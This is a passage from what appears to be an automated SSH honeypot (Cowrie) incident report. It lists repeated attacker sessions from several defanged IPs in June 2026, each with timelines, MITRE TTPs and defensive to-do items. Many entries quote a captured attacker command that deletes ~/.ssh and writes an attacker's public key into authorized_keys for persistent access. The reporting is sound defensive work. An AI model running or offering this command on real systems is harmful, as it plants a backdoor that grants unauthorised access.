- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806d6d48034c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:35 |
| **Last Seen** | 2026-06-04 04:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:35:46` | `cowrie.session.connect` |
| `2026-06-04 04:35:46` | `cowrie.client.version` |
| `2026-06-04 04:35:46` | `cowrie.client.kex` |
| `2026-06-04 04:35:47` | `cowrie.login.success` |
| `2026-06-04 04:35:48` | `cowrie.session.params` |
| `2026-06-04 04:35:48` | `cowrie.command.input` |
| `2026-06-04 04:35:48` | `cowrie.command.failed` |
| `2026-06-04 04:35:48` | `cowrie.log.closed` |
| `2026-06-04 04:35:48` | `cowrie.session.params` |
| `2026-06-04 04:35:48` | `cowrie.command.input` |
| `2026-06-04 04:35:48` | `cowrie.session.file_download` |
| `2026-06-04 04:35:48` | `cowrie.log.closed` |
| `2026-06-04 04:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf40ac2fb991

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:35 |
| **Last Seen** | 2026-06-04 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:35:51` | `cowrie.session.connect` |
| `2026-06-04 04:35:51` | `cowrie.client.version` |
| `2026-06-04 04:35:51` | `cowrie.client.kex` |
| `2026-06-04 04:35:52` | `cowrie.login.success` |
| `2026-06-04 04:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d76f51fcb26

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:46 |
| **Last Seen** | 2026-06-04 04:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:46:09` | `cowrie.session.connect` |
| `2026-06-04 04:46:09` | `cowrie.client.version` |
| `2026-06-04 04:46:09` | `cowrie.client.kex` |
| `2026-06-04 04:46:10` | `cowrie.login.success` |
| `2026-06-04 04:46:10` | `cowrie.session.params` |
| `2026-06-04 04:46:10` | `cowrie.command.input` |
| `2026-06-04 04:46:10` | `cowrie.command.failed` |
| `2026-06-04 04:46:10` | `cowrie.log.closed` |
| `2026-06-04 04:46:11` | `cowrie.session.params` |
| `2026-06-04 04:46:11` | `cowrie.command.input` |
| `2026-06-04 04:46:11` | `cowrie.session.file_download` |
| `2026-06-04 04:46:11` | `cowrie.log.closed` |
| `2026-06-04 04:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018b0235f54e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 04:46 |
| **Last Seen** | 2026-06-04 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 04:46:14` | `cowrie.session.connect` |
| `2026-06-04 04:46:14` | `cowrie.client.version` |
| `2026-06-04 04:46:14` | `cowrie.client.kex` |
| `2026-06-04 04:46:15` | `cowrie.login.success` |
| `2026-06-04 04:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf55c960b493

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 05:00 |
| **Last Seen** | 2026-06-04 05:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 05:00:19` | `cowrie.session.connect` |
| `2026-06-04 05:00:19` | `cowrie.client.version` |
| `2026-06-04 05:00:19` | `cowrie.client.kex` |
| `2026-06-04 05:00:20` | `cowrie.login.success` |
| `2026-06-04 05:00:20` | `cowrie.session.params` |
| `2026-06-04 05:00:20` | `cowrie.command.input` |
| `2026-06-04 05:00:20` | `cowrie.command.failed` |
| `2026-06-04 05:00:21` | `cowrie.log.closed` |
| `2026-06-04 05:00:21` | `cowrie.session.params` |
| `2026-06-04 05:00:21` | `cowrie.command.input` |
| `2026-06-04 05:00:21` | `cowrie.session.file_download` |
| `2026-06-04 05:00:21` | `cowrie.log.closed` |
| `2026-06-04 05:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c47288ba7e9

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 05:00 |
| **Last Seen** | 2026-06-04 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 05:00:24` | `cowrie.session.connect` |
| `2026-06-04 05:00:24` | `cowrie.client.version` |
| `2026-06-04 05:00:24` | `cowrie.client.kex` |
| `2026-06-04 05:00:25` | `cowrie.login.success` |
| `2026-06-04 05:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecb76c2197ca

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 05:03 |
| **Last Seen** | 2026-06-04 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 05:03:41` | `cowrie.session.connect` |
| `2026-06-04 05:03:41` | `cowrie.client.version` |
| `2026-06-04 05:03:41` | `cowrie.client.kex` |
| `2026-06-04 05:03:42` | `cowrie.login.success` |
| `2026-06-04 05:03:42` | `cowrie.session.params` |
| `2026-06-04 05:03:42` | `cowrie.command.input` |
| `2026-06-04 05:03:42` | `cowrie.command.failed` |
| `2026-06-04 05:03:43` | `cowrie.log.closed` |
| `2026-06-04 05:03:43` | `cowrie.session.params` |
| `2026-06-04 05:03:43` | `cowrie.command.input` |
| `2026-06-04 05:03:43` | `cowrie.session.file_download` |
| `2026-06-04 05:03:43` | `cowrie.log.closed` |
| `2026-06-04 05:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ffb6140f91

| Field | Detail |
|---|---|
| **Source IP** | `152.32.205[.]153` |
| **First Seen** | 2026-06-04 05:03 |
| **Last Seen** | 2026-06-04 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 05:03:46` | `cowrie.session.connect` |
| `2026-06-04 05:03:46` | `cowrie.client.version` |
| `2026-06-04 05:03:46` | `cowrie.client.kex` |
| `2026-06-04 05:03:47` | `cowrie.login.success` |
| `2026-06-04 05:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.205[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.205[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3c351997241

| Field | Detail |
|---|---|
| **Source IP** | `122.175.36[.]92` |
| **First Seen** | 2026-06-04 05:37 |
| **Last Seen** | 2026-06-04 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 05:37:46` | `cowrie.session.connect` |
| `2026-06-04 05:37:46` | `cowrie.client.version` |
| `2026-06-04 05:37:46` | `cowrie.client.kex` |
| `2026-06-04 05:37:47` | `cowrie.login.success` |
| `2026-06-04 05:37:47` | `cowrie.session.params` |
| `2026-06-04 05:37:47` | `cowrie.command.input` |
| `2026-06-04 05:37:47` | `cowrie.command.failed` |
| `2026-06-04 05:37:47` | `cowrie.log.closed` |
| `2026-06-04 05:37:47` | `cowrie.session.params` |
| `2026-06-04 05:37:47` | `cowrie.command.input` |
| `2026-06-04 05:37:47` | `cowrie.session.file_download` |
| `2026-06-04 05:37:47` | `cowrie.log.closed` |
| `2026-06-04 05:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.36[.]92` to AbuseIPDB if not already reported
- [ ] Block `122.175.36[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647064d85334

| Field | Detail |
|---|---|
| **Source IP** | `122.175.36[.]92` |
| **First Seen** | 2026-06-04 05:37 |
| **Last Seen** | 2026-06-04 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 05:37:48` | `cowrie.session.connect` |
| `2026-06-04 05:37:48` | `cowrie.client.version` |
| `2026-06-04 05:37:48` | `cowrie.client.kex` |
| `2026-06-04 05:37:48` | `cowrie.login.success` |
| `2026-06-04 05:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.36[.]92` to AbuseIPDB if not already reported
- [ ] Block `122.175.36[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-673e775a64d9

| Field | Detail |
|---|---|
| **Source IP** | `67.52.95[.]38` |
| **First Seen** | 2026-06-04 06:25 |
| **Last Seen** | 2026-06-04 06:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:25:10` | `cowrie.session.connect` |
| `2026-06-04 06:25:10` | `cowrie.client.version` |
| `2026-06-04 06:25:11` | `cowrie.client.kex` |
| `2026-06-04 06:25:12` | `cowrie.login.success` |
| `2026-06-04 06:25:13` | `cowrie.session.params` |
| `2026-06-04 06:25:13` | `cowrie.command.input` |
| `2026-06-04 06:25:13` | `cowrie.command.failed` |
| `2026-06-04 06:25:13` | `cowrie.log.closed` |
| `2026-06-04 06:25:14` | `cowrie.session.params` |
| `2026-06-04 06:25:14` | `cowrie.command.input` |
| `2026-06-04 06:25:14` | `cowrie.session.file_download` |
| `2026-06-04 06:25:14` | `cowrie.log.closed` |
| `2026-06-04 06:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.52.95[.]38` to AbuseIPDB if not already reported
- [ ] Block `67.52.95[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851584fac624

| Field | Detail |
|---|---|
| **Source IP** | `67.52.95[.]38` |
| **First Seen** | 2026-06-04 06:25 |
| **Last Seen** | 2026-06-04 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:25:17` | `cowrie.session.connect` |
| `2026-06-04 06:25:17` | `cowrie.client.version` |
| `2026-06-04 06:25:18` | `cowrie.client.kex` |
| `2026-06-04 06:25:19` | `cowrie.login.success` |
| `2026-06-04 06:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.52.95[.]38` to AbuseIPDB if not already reported
- [ ] Block `67.52.95[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98bd14c398e1

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]153` |
| **First Seen** | 2026-06-04 06:30 |
| **Last Seen** | 2026-06-04 06:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:30:49` | `cowrie.session.connect` |
| `2026-06-04 06:30:49` | `cowrie.client.version` |
| `2026-06-04 06:30:49` | `cowrie.client.kex` |
| `2026-06-04 06:30:50` | `cowrie.login.success` |
| `2026-06-04 06:30:51` | `cowrie.session.params` |
| `2026-06-04 06:30:51` | `cowrie.command.input` |
| `2026-06-04 06:30:51` | `cowrie.command.failed` |
| `2026-06-04 06:30:51` | `cowrie.log.closed` |
| `2026-06-04 06:30:51` | `cowrie.session.params` |
| `2026-06-04 06:30:51` | `cowrie.command.input` |
| `2026-06-04 06:30:52` | `cowrie.session.file_download` |
| `2026-06-04 06:30:52` | `cowrie.log.closed` |
| `2026-06-04 06:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]153` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80b6a6e1931

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]153` |
| **First Seen** | 2026-06-04 06:30 |
| **Last Seen** | 2026-06-04 06:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:30:55` | `cowrie.session.connect` |
| `2026-06-04 06:30:55` | `cowrie.client.version` |
| `2026-06-04 06:30:55` | `cowrie.client.kex` |
| `2026-06-04 06:30:56` | `cowrie.login.success` |
| `2026-06-04 06:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]153` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b85fdbe814cd

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:42 |
| **Last Seen** | 2026-06-04 06:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:42:07` | `cowrie.session.connect` |
| `2026-06-04 06:42:07` | `cowrie.client.version` |
| `2026-06-04 06:42:07` | `cowrie.client.kex` |
| `2026-06-04 06:42:08` | `cowrie.login.success` |
| `2026-06-04 06:42:08` | `cowrie.session.params` |
| `2026-06-04 06:42:08` | `cowrie.command.input` |
| `2026-06-04 06:42:08` | `cowrie.command.failed` |
| `2026-06-04 06:42:09` | `cowrie.log.closed` |
| `2026-06-04 06:42:09` | `cowrie.session.params` |
| `2026-06-04 06:42:09` | `cowrie.command.input` |
| `2026-06-04 06:42:09` | `cowrie.session.file_download` |
| `2026-06-04 06:42:09` | `cowrie.log.closed` |
| `2026-06-04 06:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0adde32a35

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:42 |
| **Last Seen** | 2026-06-04 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:42:12` | `cowrie.session.connect` |
| `2026-06-04 06:42:12` | `cowrie.client.version` |
| `2026-06-04 06:42:12` | `cowrie.client.kex` |
| `2026-06-04 06:42:13` | `cowrie.login.success` |
| `2026-06-04 06:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f884b21c901d

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:42 |
| **Last Seen** | 2026-06-04 06:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
